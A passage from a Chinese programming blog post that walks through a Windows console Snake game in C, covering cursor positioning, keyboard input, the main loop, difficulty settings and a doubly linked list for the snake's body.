class="type">void</span> <span class="title function_">initGame</span><span class="params">()</span> &#123;<span class="comment">// 初始化各项数据,这些函数在game.c中定义</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>); <span class="comment">// 清屏</span></span><br><span class="line">setDifficulty(); <span class="comment">// 设置游戏难度</span></span><br><span class="line">printBox(); <span class="comment">//打印界面</span></span><br><span class="line">initSnakeAndApple(); <span class="comment">//初始化游戏数据---蛇和苹果的初始状态</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">wrongInput</span><span class="params">()</span> &#123;<span class="comment">//处理错误的键盘输入---打印报错信息</span></span><br><span class="line">gotoxy(<span class="number">43</span>, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">Sleep(<span class="number">1000</span>);<span class="comment">//停顿一秒后清除信息</span></span><br><span class="line">gotoxy(<span class="number">43</span>, <span class="number">17</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         &quot;</span>);</span><br><span class="line">gotoxy(<span class="number">39</span>, <span class="number">17</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="系统相关支持-system-c">系统相关支持—system.c</h2><p>因为是一定程度上基于Windows的程序(主要是一些优化和完善,还有关键的光标跳转),需要使用一些win API函数</p><p>使用_kbhit()来实现检测按键</p><p>头文件包含:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span> <span class="comment">// Win API支持</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//涉及到windows的API</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">color</span><span class="params">(<span class="type">int</span> i)</span> &#123;<span class="comment">//更改文字颜色</span></span><br><span class="line"><span class="comment">//SetConsoleTextAttribute是API设置控制台窗口字体颜色和背景色的函数</span></span><br><span class="line">SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//游戏中每次调用gotoxy时的参数都是根据游戏菜单字符位置/当前坐标计算好传递过来的</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">gotoxy</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">COORD c;</span><br><span class="line"><span class="type">static</span> HANDLE h;</span><br><span class="line">h = GetStdHandle(STD_OUTPUT_HANDLE);<span class="comment">//从标准设备获取句柄</span></span><br><span class="line">c.X = x;</span><br><span class="line">c.Y = y;</span><br><span class="line">SetConsoleCursorPosition(h, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">keyboard</span><span class="params">(<span class="type">int</span> pre)</span> &#123;<span class="comment">//键盘输入判断</span></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="type">int</span> n = pre;</span><br><span class="line"><span class="keyword">if</span> (_kbhit()) &#123;<span class="comment">//检查是否有键盘输入</span></span><br><span class="line">c = _getch();<span class="comment">//如果有,则进行一次读取</span></span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;w&#x27;</span> || c == <span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;a&#x27;</span> || c == <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">n = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;s&#x27;</span> || c == <span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">n = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;d&#x27;</span> || c == <span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">n = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">n = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">rewind(<span class="built_in">stdin</span>);<span class="comment">//fflush(stdin); 刷新缓冲区,在VS2015之后不再起作用(编译成功但无效果)</span></span><br><span class="line"><span class="keyword">if</span> ((pre == <span class="number">1</span> &amp;&amp; n == <span class="number">3</span>) || (pre == <span class="number">2</span> &amp;&amp; n == <span class="number">4</span>) || (pre == <span class="number">3</span> &amp;&amp; n == <span class="number">1</span>) || (pre == <span class="number">4</span> &amp;&amp; n == <span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> pre;<span class="comment">//如果键盘要求蛇180度转向,则转向失败,蛇仍然按照原来的方向前进</span></span><br><span class="line"><span class="keyword">return</span> n;<span class="comment">//成功转向,返回下一步前进的方向</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="游戏逻辑-game-c">游戏逻辑—game.c</h2><p>包含了所有的初始化操作,游戏运行逻辑,结算处理</p><p>头文件包含:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snake.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>关键代码:</p><h3 id="游戏主循环-start-函数">游戏主循环—start()函数</h3><p>逻辑伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">start</span><span class="params">()</span>&#123;</span><br><span class="line">print_tips(); <span class="comment">// 打印提示</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(againstTheWall() || againstSelf())&#123;</span><br><span class="line">            gameover();<span class="comment">//进行游戏结束的处理</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        print_score();</span><br><span class="line">        </span><br><span class="line">        snake_move(); <span class="comment">//包含有键盘输入的检测和处理,并在检测到暂停时修改pause_game的值</span></span><br><span class="line">        <span class="keyword">if</span>(eat_apple())&#123;</span><br><span class="line">            snake_growth(); <span class="comment">// 蛇长长</span></span><br><span class="line">            <span class="keyword">if</span> (SnakeLen == maxSnakeLen) &#123;</span><br><span class="line">                gamewin();<span class="comment">// 霸屏则游戏胜利</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            generate_new_apples(); <span class="comment">// 生成新苹果</span></span><br><span class="line">            score++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pause_game)&#123;</span><br><span class="line">            pause_the_game(); <span class="comment">//  暂停,直到检测到要求继续的键盘输入</span></span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(wait_time); <span class="comment">// 休眠一段时间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="游戏初始化">游戏初始化</h3><h4 id="设置游戏难度-setdifficulty-函数">设置游戏难度—setDifficulty()函数</h4><p>设置了5个难度,分别对应start()中不同的Sleep时间,以此来影响蛇移动的速度</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setDifficulty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n, difficulties[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">1000</span>, <span class="number">800</span>, <span class="number">600</span>, <span class="number">400</span>, <span class="number">200</span>&#125;;<span class="comment">//5种游戏难度---对应不同的等待时间</span></span><br><span class="line">    <span class="comment">// 界面优化相关代码忽略</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输入处理</span></span><br><span class="line">    <span class="type">bool</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n) &amp;&amp; n &gt; <span class="number">0</span> &amp;&amp; n &lt; <span class="number">6</span>)</span><br><span class="line">            flag = <span class="number">0</span>;<span class="comment">//输入成功则跳出循环</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入难度[1~5](按回车键确认):&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">            rewind(<span class="built_in">stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据输入调整游戏参数</span></span><br><span class="line">    <span class="comment">//wait = 1100 - n * 200; // 旧的调整方法</span></span><br><span class="line">    wait = difficulties[n];<span class="comment">//设置等待时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化分数</span></span><br><span class="line">    score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rewind(<span class="built_in">stdin</span>);<span class="comment">//刷新缓冲区</span></span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//清屏</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="打印界面-printbox-函数">打印界面—printBox()函数</h4><p>关键是坐标的计算,要在正确的位置进行打印</p><p>使用&quot;□&quot;字符串进行地图的打印,<strong>因为该字符占用2字节,所以x坐标每次要+=2而不是+=1</strong></p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printBox</span><span class="params">()</span>&#123;</span><br><span class="line">set_map_size(); <span class="comment">// 设置地图大小,大小包括边界(WIDTH和HEIGHT变量,代码略)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//+=2的原因是方块字符并非ASCII字符,占用两个字节大小---坐标每次需要+2而不是+1</span></span><br><span class="line">    <span class="comment">//打印围墙</span></span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; WIDTH * <span class="number">2</span>; i += <span class="number">2</span>) &#123;<span class="comment">//上下</span></span><br><span class="line">        gotoxy(i, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        gotoxy(i, HEIGHT - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= HEIGHT - <span class="number">1</span>; i++) &#123;<span class="comment">//左右</span></span><br><span class="line">        gotoxy(<span class="number">0</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        gotoxy(WIDTH * <span class="number">2</span> - <span class="number">2</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打印盒子内部</span></span><br><span class="line">    color(<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= HEIGHT - <span class="number">2</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; WIDTH * <span class="number">2</span> - <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">            gotoxy(i, j);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="初始化蛇和苹果数据">初始化蛇和苹果数据</h4><p>此处涉及到链表操作!</p><p>1.首先容易想到苹果只需要记录其x,y坐标即可</p><p>2.然后对于蛇,其行为有2种—向前移动一格而不增长,前进并增长一格</p><p>3.而且蛇的每一个结点的运动方向都不一定相同—因为蛇会拐弯</p><p>如果使用单链表,就需要对每一个结点保存其下次前进的方向,也就是要知道其前一个结点的坐标是在当前结点的哪个方向(上/下/左/右)并进行存储,不仅浪费空间,而且频繁修改会导致效率低下</p><p>所以,这里使用双链表来实现,很容易找到前一个结点的坐标来确定移动方向</p><p>实际上这里的双链表实际只影响了当前的蛇尾,因为蛇的每一个节点都是相同的,所以前进仅需在蛇头前进方向新增一个蛇头结点作为新蛇头(代码实现实际上是在蛇头后添加一个蛇身结点),然后删除当前的最后一个结点,即蛇尾</p><p>由此为了效率还需使用一个尾指针tail来指向蛇尾(链表尾)</p><p>综上所述,我们要存储(初始化)的数据即为:</p><p>1.苹果的坐标结构体<br>2.一个带有头结点(直接作为蛇头)的双向链表<br>3.一个指向当前链表尾结点(蛇尾)的指针tail</p><p>同时该部分还要进行游戏刚开始的苹果(默认在地图左上角),蛇身(默认在苹果右边,初始长度为4)的打印</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">initSnakeAndApple</span><span class="params">()</span>&#123;</span><br><span class="line">    make_a_snake(<span class="number">4</span>); <span class="comment">// 创建一条长度为4的蛇---即初始化一个双向链表,并设置尾指针</span></span><br><span class="line">    <span class="comment">// 同时要对蛇的每一个节点设置初始坐标</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置蛇的长度相关参数</span></span><br><span class="line">    curSnakeLen = <span class="number">4</span>;<span class="comment">//初始时蛇的长度为4</span></span><br><span class="line">    maxSnakeLen = (WIDTH - <span class="number">2</span>) * (HEIGHT - <span class="number">2</span>);<span class="comment">//根据地图大小计算游戏胜利蛇应该达到的长度</span></span><br><span class="line"></span><br><span class="line">    init_apple(<span class="number">8</span>,<span class="number">4</span>); <span class="comment">// 初始化苹果</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//因为代码实现是先无条件前进再进行吃到苹果的处理,所以蛇尾此时已移动,需要提前记录前一个蛇尾的位置</span></span><br><span class="line">    pre_x = tail-&gt;x;</span><br><span class="line">    pre_y = tail-&gt;y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="蛇移动-movesnake-函数">蛇移动—moveSnake()函数</h3><p>因为蛇移动并没有长度变化,即蛇头增长,蛇尾缩短,所以直接把蛇尾结点移动到蛇头即可</p><p>对应到链表操作即为修改指针指向,将头结点之后的第一个蛇结点修改为蛇尾,蛇尾结点指向第二个蛇结点,然后倒数第二个结点后驱指向NULL</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">moveSnake</span><span class="params">(<span class="type">int</span> flag)</span> &#123;<span class="comment">//蛇的正常前进</span></span><br><span class="line">    <span class="type">int</span> move[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">0</span>,  <span class="number">-1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">-2</span>, <span class="number">0</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0</span>,  <span class="number">1</span>&#125;,</span><br><span class="line">            &#123;<span class="number">2</span>,  <span class="number">0</span>&#125;</span><br><span class="line">    &#125;;<span class="comment">//4种不同的移动方向对应的4种坐标变换</span></span><br><span class="line">    flag--;<span class="comment">//对应move数组的元素--从下标0开始</span></span><br><span class="line">    <span class="comment">//保存蛇尾位置</span></span><br><span class="line">    pre_x = tail-&gt;x;</span><br><span class="line">    pre_y = tail-&gt;y;</span><br><span class="line">    <span class="comment">//蛇尾,旧蛇头覆盖打印</span></span><br><span class="line">    gotoxy(tail-&gt;x, tail-&gt;y);</span><br><span class="line">    color(<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;□&quot;</span>);</span><br><span class="line"></span><br><span class="line">    gotoxy(head-&gt;x, head-&gt;y);</span><br><span class="line">    color(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">    <span class="comment">//蛇尾断开</span></span><br><span class="line">    snake *temp = tail;</span><br><span class="line">    tail = tail-&gt;prior;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//蛇尾结点作为新头,不需要删除创建,节省时间</span></span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    temp-&gt;prior = <span class="literal">NULL</span>;</span><br><span class="line">    head-&gt;prior = temp;</span><br><span class="line">    head = temp;</span><br><span class="line">    <span class="comment">//新蛇头位置计算并打印</span></span><br><span class="line">    head-&gt;x = head-&gt;next-&gt;x + move[flag][<span class="number">0</span>];</span><br><span class="line">    head-&gt;y = head-&gt;next-&gt;y + move[flag][<span class="number">1</span>];</span><br><span class="line">    gotoxy(head-&gt;x, head-&gt;y);</span><br><span class="line">    color(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="蛇长长-snakegrowth-函数">蛇长长—snakeGrowth()函数</h3><p>实际上是双向链表的尾插结点操作</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">snakeGrowth</span><span class="params">()</span> &#123;<span class="comment">//蛇的长度增长</span></span><br><span class="line">    <span class="comment">//新增蛇身结点---即在蛇尾新增一个结点并即刻打印(蛇此时已前进一格且吃到苹果</span></span><br><span class="line">    tail-&gt;next = (snake *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(snake));</span><br><span class="line">    tail-&gt;next-&gt;prior = tail;</span><br><span class="line">    tail = tail-&gt;next;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    tail-&gt;x = pre_x;</span><br><span class="line">    tail-&gt;y = pre_y;</span><br><span class="line">    ++curSnakeLen;<span class="comment">//当前长度+1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印图像</span></span><br><span class="line">    gotoxy(pre_x, pre_y);</span><br><span class="line">    color(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);<span class="comment">//进行打印</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="吃到苹果的处理">吃到苹果的处理</h3><p>要进行胜负判断苹果的重新生成和打印</p><h4 id="关键代码">关键代码:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进行下一个苹果的生成(随机)</span></span><br><span class="line">srand((<span class="type">unsigned</span> <span class="type">int</span>) time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    apple.x = ((rand() % (WIDTH - <span class="number">2</span>)) + <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">    apple.y = (rand() % (HEIGHT - <span class="number">2</span>)) + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (isOverlap()); <span class="comment">// 直到苹果生成在正确的(没有生成在蛇身体上---需要对蛇的链表进行遍历)位置</span></span><br><span class="line">gotoxy(apple.x, apple.y); <span class="comment">// 跳转到该坐标并进行打印苹果</span></span><br><span class="line">color(<span class="number">4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;■&quot;</span>);</span><br><span class="line">score++; <span class="comment">// 分数+1</span></span><br></pre></td></tr></table></figure><h4 id="判断坐标是否正确-isoverlap-函数">判断坐标是否正确—isOverlap()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isOverlap</span><span class="params">()</span> &#123;<span class="comment">// 检查新生成的苹果坐标是否和蛇身的任何一个部位重合</span></span><br><span class="line">    snake *temp = head;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;<span class="comment">// 遍历蛇身链表</span></span><br><span class="line">        <span class="keyword">if</span> (apple.x == temp-&gt;x &amp;&amp; apple.y == temp-&gt;y)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="胜负判断-是否撞墙或是否撞到自己">胜负判断—是否撞墙或是否撞到自己</h3><h4 id="是否撞墙-againstthewall-函数">是否撞墙—againstTheWall()函数</h4><p>只需要判断蛇头的坐标是否和边界重合</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">againstTheWall</span><span class="params">()</span> &#123;<span class="comment">//检查撞墙即检查蛇头的坐标是否和墙壁的坐标重合</span></span><br><span class="line">    <span class="keyword">if</span> (head-&gt;x == <span class="number">0</span> || head-&gt;x == WIDTH * <span class="number">2</span> - <span class="number">2</span> ||</span><br><span class="line">        head-&gt;y == <span class="number">0</span> || head-&gt;y == HEIGHT - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="是否撞到自己-againstthewall-函数">是否撞到自己—againstTheWall()函数</h4><p>此时需要遍历整个链表(除了蛇头)来和蛇头的坐标进行比较</p><p>关键代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">againstSelf</span><span class="params">()</span> &#123; <span class="comment">// 检查撞到自己即检查蛇头的坐标是否和任一蛇身的坐标重合</span></span><br><span class="line">    snake *temp = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123; <span class="comment">// 对链表进行遍历</span></span><br><span class="line">        <span class="keyword">if</span> (head-&gt;x == temp-&gt;x &amp;&amp; head-&gt;y == temp-&gt;y)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        temp = temp-&gt;next; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="销毁数据-destorygamedata-函数">销毁数据—destoryGameData()函数</h3><p>每局游戏需要进行数据的销毁(链表)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">destoryGameData</span><span class="params">()</span> &#123;<span class="comment">//主要任务即销毁链表</span></span><br><span class="line">    snake *temp = head;</span><br><span class="line">    snake *next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;<span class="comment">//遍历蛇身链表</span></span><br><span class="line">        next = temp-&gt;next;<span class="comment">//蛇最短也有4个结点,不存在temp和temp-&gt;next为NULL的情况</span></span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">        temp = next;</span><br><span class="line">    &#125;</span><br><span 